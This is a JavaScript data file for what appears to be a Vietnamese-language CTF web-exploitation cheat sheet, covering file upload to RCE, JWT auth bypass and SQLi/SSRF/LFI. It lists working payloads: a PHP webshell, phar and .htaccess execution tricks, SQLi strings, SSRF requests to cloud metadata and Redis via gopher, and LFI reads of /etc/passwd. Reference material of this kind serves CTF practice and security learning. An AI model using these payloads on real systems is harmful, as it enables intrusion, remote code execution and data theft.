DATA.find(s => s.id === "web").items.push(
  {
    id: "web-upload",
    title: "Upload → RCE",
    summary: "Upload không chỉ là đổi extension. Đi theo chuỗi: upload → truy cập → execute → bypass disable_functions.",
    tags: ["upload", "phar", "rce", "php"],
    priority: "high",
    signals: [
      "Có avatar/attachment/file preview",
      "Filter extension hoặc MIME",
      "Có disable_functions trong PHP",
      "Có include/LFI đi kèm"
    ],
    checklist: [
      "Tìm path upload và URL truy cập file.",
      "Thử .php, .phtml, .phar, .php5, .htaccess, .user.ini.",
      "Bypass MIME/magic bytes/polyglot.",
      "Nếu không exec: .htaccess AddType hoặc .user.ini auto_prepend_file.",
      "Nếu có phar: tạo phar + include qua phar://.",
      "Check disable_functions; thử FFI/LD_PRELOAD/imap_open.",
      "Nếu có readflag: đọc /readflag hoặc /flag."
    ],
    payloads: [
      { title: "PHP webshell", code: "<?php system($_GET['c']); ?>" },
      { title: ".htaccess", code: "AddType application/x-httpd-php .jpg" },
      {
        title: "Tạo phar",
        code: C(
          "<?php",
          "$p = new Phar('shell.phar');",
          "$p->startBuffering();",
          "$p->addFromString('test.php', '<?php system($_GET[\"c\"]); ?>');",
          "$p->setStub('<?php __HALT_COMPILER(); ?>');",
          "$p->stopBuffering();",
          "?>"
        )
      },
      {
        title: "Check disable_functions",
        code: "<?php var_dump(ini_get('disable_functions')); ?>"
      }
    ],
    commands: [
      {
        title: "Build phar + upload",
        code: C(
          "php -d phar.readonly=0 make_phar.php",
          "curl -F 'file=@shell.jpg' http://TARGET/upload"
        )
      }
    ],
    gotchas: [
      "Upload dir có thể không execute; cần LFI/include để chạy.",
      "phar cần phar.readonly=0 khi tạo file.",
      "open_basedir có thể chặn đọc file ngoài.",
      "disable_functions có thể bypass bằng FFI, LD_PRELOAD, imap_open, pcntl_exec."
    ],
    links: [
      { title: "Ba bước lên mây revenge writeup", url: "https://github.com/kyrux29/CTF_WRITEUPS" },
      { title: "PortSwigger File Upload", url: "https://portswigger.net/web-security/file-upload" }
    ]
  },
  {
    id: "web-jwt",
    title: "JWT & Auth bypass",
    summary: "Decode trước, rồi thử alg none, weak secret, kid/jku và claim tampering. Đừng quên cookie/session thường.",
    tags: ["jwt", "auth", "api"],
    priority: "high",
    signals: [
      "Authorization: Bearer hoặc cookie JWT",
      "Có alg/kid/jku/x5u trong header",
      "Role/admin claim trong payload",
      "API trả token sau login"
    ],
    checklist: [
      "Decode header/payload (base64url).",
      "Thử alg:none.",
      "Crack HS256 secret bằng rockyou.",
      "Thử kid path traversal hoặc SQLi.",
      "Thử jku/x5u trỏ JWKS của bạn.",
      "Thử RS256 → HS256 confusion.",
      "Sửa claim role/admin; kiểm tra exp/iat."
    ],
    payloads: [
      {
        title: "jwt_tool",
        code: C(
          "jwt_tool TOKEN -T",
          "jwt_tool TOKEN -X a",
          "hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt"
        )
      },
      {
        title: "Decode nhanh",
        code: "echo 'TOKEN' | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null"
      }
    ],
    gotchas: [
      "base64url thiếu padding; thêm = khi decode.",
      "Token có thể nằm trong cookie, không chỉ Authorization.",
      "Server có thể check signature nhưng không check alg.",
      "Đừng bỏ qua session cookie/flask session nếu không phải JWT."
    ],
    links: [
      { title: "PortSwigger JWT", url: "https://portswigger.net/web-security/jwt" },
      { title: "jwt_tool", url: "https://github.com/ticarpi/jwt_tool" }
    ]
  },
  {
    id: "web-injection",
    title: "SQLi / SSRF / LFI",
    summary: "Ba lỗi server-side hay ra nhất trong CTF web. Kiểm tra nhanh bằng checklist, rồi đi sâu theo response.",
    tags: ["sqli", "ssrf", "lfi", "php"],
    priority: "high",
    signals: [
      "id/q/login/sort/search trong URL hoặc body",
      "url/image/webhook/fetch/import/preview",
      "file/page/include/template/download",
      "Response khác nhau theo input"
    ],
    checklist: [
      "SQLi: thử ' , \" , \\ , 1 OR 1=1, comment; xác định DBMS.",
      "SQLi: union columns, boolean/time blind; thử WAF bypass.",
      "SSRF: 127.0.0.1, localhost, [::1], 127.1, 2130706433.",
      "SSRF: metadata 169.254.169.254; file://, gopher://; bypass redirect/@/#.",
      "LFI: ../../etc/passwd; php://filter/convert.base64-encode/resource=index.php.",
      "LFI: log poisoning, session file, /proc/self/environ, pearcmd, filter chain.",
      "So sánh status/time/body để phát hiện blind."
    ],
    payloads: [
      {
        title: "SQLi",
        code: C(
          "admin' OR 1=1-- -",
          "' UNION SELECT 1,2,3-- -",
          "' AND SUBSTRING((SELECT flag FROM flag),1,1)='B'-- -",
          "' AND SLEEP(5)-- -"
        )
      },
      {
        title: "SSRF",
        code: C(
          "http://127.0.0.1:80/",
          "http://localhost/",
          "http://[::1]/",
          "http://169.254.169.254/latest/meta-data/",
          "file:///etc/passwd",
          "gopher://127.0.0.1:6379/_INFO"
        )
      },
      {
        title: "LFI / PHP wrappers",
        code: C(
          "../../../../etc/passwd",
          "php://filter/convert.base64-encode/resource=index.php",
          "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=index.php",
          "data://text/plain,<?php system($_GET['c']); ?>"
        )
      }
    ],
    commands: [
      {
        title: "SQLi tool",
        code: "sqlmap -u 'http://TARGET/item?id=1' --batch --dbs"
      },
      {
        title: "Blind SSRF / OAST",
        code: "interactsh-client"
      },
      {
        title: "Filter chain generator",
        code: "python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'"
      }
    ],
    gotchas: [
      "SQLi: khác biệt quote/paren/comment giữa MySQL, PostgreSQL, MSSQL, SQLite.",
      "SSRF: parser của server và URL parser của bạn có thể khác nhau.",
      "LFI: open_basedir/disable_functions có thể chặn; thử filter chain.",
      "Blind: đo thời gian/status/length thay vì chỉ nhìn body."
    ],
    links: [
      { title: "PortSwigger SQLi", url: "https://portswigger.net/web-security/sql-injection" },
      { title: "PortSwigger SSRF", url: "https://portswigger.net/web-security/ssrf" },
      { title: "PayloadsAllTheThings — LFI", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" },
      { title: "SSRF Bible", url: "https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf" }
    ]
  }
);
